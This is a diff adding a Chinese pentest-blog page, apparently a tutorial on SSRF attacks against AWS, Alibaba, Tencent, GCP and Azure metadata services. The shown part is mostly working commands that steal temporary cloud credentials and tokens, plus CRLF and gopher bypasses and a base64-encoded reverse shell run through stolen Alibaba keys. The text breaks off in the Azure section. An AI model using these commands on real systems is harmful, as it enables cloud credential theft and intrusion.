@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Server-Side Request Forgery（SSRF）在云环境中杀伤力被放大到极致——攻击者可直通元数据服务，窃取临时凭证、接管云资源、横向移动至整个基础设施。本文覆盖 AWS、阿里云、腾讯云、GCP、Azure 五大平台元数据攻击面，以及 STS 凭证窃取、IAM 提权、控制台生成等高级利用技术。  一、AWS EC2 元数据服务1.1 IMDSv1IMDSv1 无认证，仅依赖链">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF：云元数据攻击实战">
+<meta property="og:url" content="https://congliang.github.io/SSRF-cloud-metadata/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Server-Side Request Forgery（SSRF）在云环境中杀伤力被放大到极致——攻击者可直通元数据服务，窃取临时凭证、接管云资源、横向移动至整个基础设施。本文覆盖 AWS、阿里云、腾讯云、GCP、Azure 五大平台元数据攻击面，以及 STS 凭证窃取、IAM 提权、控制台生成等高级利用技术。  一、AWS EC2 元数据服务1.1 IMDSv1IMDSv1 无认证，仅依赖链">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.975Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/SSRF-cloud-metadata/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/SSRF-cloud-metadata/","path":"SSRF-cloud-metadata/","title":"SSRF：云元数据攻击实战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SSRF：云元数据攻击实战 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81AWS-EC2-%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.</span> <span class="nav-text">一、AWS EC2 元数据服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-IMDSv1"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 IMDSv1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-IMDSv2-%E5%AF%B9%E6%8A%97"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 IMDSv2 对抗</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E9%98%BF%E9%87%8C%E4%BA%91-ECS-%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1"><span class="nav-number">3.</span> <span class="nav-text">二、阿里云 ECS 元数据服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E8%85%BE%E8%AE%AF%E4%BA%91-CVM-%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.</span> <span class="nav-text">三、腾讯云 CVM 元数据服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81GCP-Compute-Engine-%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1"><span class="nav-number">5.</span> <span class="nav-text">四、GCP Compute Engine 元数据服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Azure-%E5%AE%9E%E4%BE%8B%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.</span> <span class="nav-text">五、Azure 实例元数据服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81STS-%E5%87%AD%E8%AF%81%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">7.</span> <span class="nav-text">六、STS 凭证持久化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81IAM-%E8%A7%92%E8%89%B2%E6%8F%90%E6%9D%83"><span class="nav-number">8.</span> <span class="nav-text">七、IAM 角色提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%AE%BF%E9%97%AE%E7%94%9F%E6%88%90"><span class="nav-number">9.</span> <span class="nav-text">八、控制台访问生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">九、防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82"><span class="nav-number">10.1.</span> <span class="nav-text">应用层</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%91%E5%B9%B3%E5%8F%B0%E5%B1%82"><span class="nav-number">10.2.</span> <span class="nav-text">云平台层</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E6%8E%A7%E8%A6%81%E7%82%B9"><span class="nav-number">10.3.</span> <span class="nav-text">监控要点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">11.</span> <span class="nav-text">十、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">12.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SSRF-cloud-metadata/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SSRF：云元数据攻击实战 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF：云元数据攻击实战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-11-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-11-01T08:00:00+08:00">2025-11-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Server-Side Request Forgery（SSRF）在云环境中杀伤力被放大到极致——攻击者可直通元数据服务，窃取临时凭证、接管云资源、横向移动至整个基础设施。本文覆盖 AWS、阿里云、腾讯云、GCP、Azure 五大平台元数据攻击面，以及 STS 凭证窃取、IAM 提权、控制台生成等高级利用技术。</p>
+<hr>
+<h2 id="一、AWS-EC2-元数据服务"><a href="#一、AWS-EC2-元数据服务" class="headerlink" title="一、AWS EC2 元数据服务"></a>一、AWS EC2 元数据服务</h2><h3 id="1-1-IMDSv1"><a href="#1-1-IMDSv1" class="headerlink" title="1.1 IMDSv1"></a>1.1 IMDSv1</h3><p>IMDSv1 无认证，仅依赖链路本地地址不可路由的特性。SSRF 打穿后元数据完全暴露。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/ami-id</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/hostname</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/local-ipv4</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/instance-id</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/placement/region</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key</span><br><span class="line"></span><br><span class="line"><span class="comment"># IAM 角色 → 临时凭证 (AccessKeyId + SecretAccessKey + Token)</span></span><br><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</span><br><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>SSRF 文件包含（PHP）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// /ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>gopher 协议绕过：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://target/ssrf?url=gopher://169.254.169.254:80/_GET%20/latest/meta-data/...%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-IMDSv2-对抗"><a href="#1-2-IMDSv2-对抗" class="headerlink" title="1.2 IMDSv2 对抗"></a>1.2 IMDSv2 对抗</h3><p>IMDSv2 要求先 PUT 获取 Token，多数 SSRF 仅支持 GET&#x2F;POST，三种绕过思路如下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常流程</span></span><br><span class="line">TOKEN=$(curl -X PUT <span class="string">&quot;http://169.254.169.254/latest/api/token&quot;</span> -H <span class="string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>)</span><br><span class="line">curl -H <span class="string">&quot;X-aws-ec2-metadata-token: <span class="variable">$TOKEN</span>&quot;</span> http://169.254.169.254/latest/meta-data/...</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过 1 — DNS Rebinding：</strong> 首次解析到攻击者 IP（通过 Host 校验），TTL 到期后切回 169.254.169.254。</p>
+<p><strong>绕过 2 — CRLF 注入</strong>（取决于底层库实现）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0aGET%20/...</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过 3 — 支持 PUT 的 SSRF 底层库：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">token = requests.put(<span class="string">&quot;http://169.254.169.254/latest/api/token&quot;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&quot;X-aws-ec2-metadata-token-ttl-seconds&quot;</span>: <span class="string">&quot;21600&quot;</span>&#125;).text</span><br><span class="line">creds = requests.get(<span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role&quot;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&quot;X-aws-ec2-metadata-token&quot;</span>: token&#125;).json()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、阿里云-ECS-元数据服务"><a href="#二、阿里云-ECS-元数据服务" class="headerlink" title="二、阿里云 ECS 元数据服务"></a>二、阿里云 ECS 元数据服务</h2><p>元数据地址 <code>100.100.100.200</code>（链路本地）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">curl http://100.100.100.200/latest/meta-data/</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/instance-id</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/hostname</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/private-ipv4</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/region-id</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/zone-id</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/vpc-id</span><br><span class="line"></span><br><span class="line"><span class="comment"># RAM 角色临时凭证</span></span><br><span class="line">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/&lt;role-name&gt;</span><br><span class="line"><span class="comment"># 返回: AccessKeyId, AccessKeySecret, SecurityToken, Expiration</span></span><br><span class="line"></span><br><span class="line">curl http://100.100.100.200/latest/user-data/</span><br><span class="line">curl http://100.100.100.200/latest/meta-data/public-keys/0/openssh-key</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 + 云助手反弹 Shell：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aliyun configure <span class="built_in">set</span> --profile stolen --access-key-id STS.xxxxx --access-key-secret xxxxx --sts-token xxxxx --region cn-hangzhou</span><br><span class="line">aliyun ecs DescribeInstances --profile stolen</span><br><span class="line">aliyun ecs RunCommand --InstanceId i-xxx --Type RunShellScript --CommandContent <span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=&quot;</span> --profile stolen</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、腾讯云-CVM-元数据服务"><a href="#三、腾讯云-CVM-元数据服务" class="headerlink" title="三、腾讯云 CVM 元数据服务"></a>三、腾讯云 CVM 元数据服务</h2><p>端点：<code>169.254.0.23</code> &#x2F; <code>metadata.tencentyun.com</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/</span><br><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/instance-id</span><br><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/local-ipv4</span><br><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/placement/region</span><br><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/app-id</span><br><span class="line"></span><br><span class="line"><span class="comment"># CAM 角色凭证</span></span><br><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/</span><br><span class="line">curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/&lt;role-name&gt;</span><br><span class="line"><span class="comment"># 返回: TmpSecretId, TmpSecretKey, Token, ExpiredTime</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TENCENTCLOUD_SECRET_ID=&lt;TmpSecretId&gt; TENCENTCLOUD_SECRET_KEY=&lt;TmpSecretKey&gt; TENCENTCLOUD_SECURITY_TOKEN=&lt;Token&gt;</span><br><span class="line">tccli cvm DescribeInstances</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、GCP-Compute-Engine-元数据服务"><a href="#四、GCP-Compute-Engine-元数据服务" class="headerlink" title="四、GCP Compute Engine 元数据服务"></a>四、GCP Compute Engine 元数据服务</h2><p>地址 <code>metadata.google.internal</code>，强制 <code>Metadata-Flavor: Google</code> 头。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">H=<span class="string">&quot;Metadata-Flavor: Google&quot;</span>; B=<span class="string">&quot;http://metadata.google.internal/computeMetadata/v1&quot;</span></span><br><span class="line"></span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/id</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/name</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/zone</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/machine-type</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/network-interfaces/0/ip</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/network-interfaces/0/access-configs/0/external-ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务帐号 → OAuth2 Access Token</span></span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/service-accounts/</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/service-accounts/&lt;sa&gt;/?recursive=<span class="literal">true</span></span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/service-accounts/default/token</span><br><span class="line"><span class="comment"># 返回: &#123; &quot;access_token&quot;: &quot;ya29.c.xxx...&quot;, &quot;expires_in&quot;: 3599 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Identity Token（访问 Cloud Functions）</span></span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/instance/service-accounts/default/identity?audience=https://example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 密钥 / 启动脚本</span></span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/attributes/ssh-keys</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/instance/attributes/startup-script</span><br><span class="line">curl -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="variable">$B</span>/project/attributes/</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过 <code>Metadata-Flavor</code> 头 — CRLF 注入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://target/ssrf?url=http://metadata.google.internal/...token%0d%0aMetadata-Flavor:%20Google&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、Azure-实例元数据服务"><a href="#五、Azure-实例元数据服务" class="headerlink" title="五、Azure 实例元数据服务"></a>五、Azure 实例元数据服务</h2><p>地址 <code>169.254.169.254</code>，强制 <code>Metadata: true</code> 头及 <code>api-version</code> 参数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">H=<span class="string">&quot;Metadata: true&quot;</span>; API=<span class="string">&quot;api-version=2021-02-01&quot;</span>; B=<span class="string">&quot;http://169.254.169.254/metadata/instance&quot;</span></span><br><span class="line"></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute?<span class="variable">$API</span>&quot;</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute/name?<span class="variable">$API</span>&amp;format=text&quot;</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute/resourceGroupName?<span class="variable">$API</span>&amp;format=text&quot;</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute/subscriptionId?<span class="variable">$API</span>&amp;format=text&quot;</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute/location?<span class="variable">$API</span>&amp;format=text&quot;</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute/publicKeys?<span class="variable">$API</span>&quot;</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/compute/userData?<span 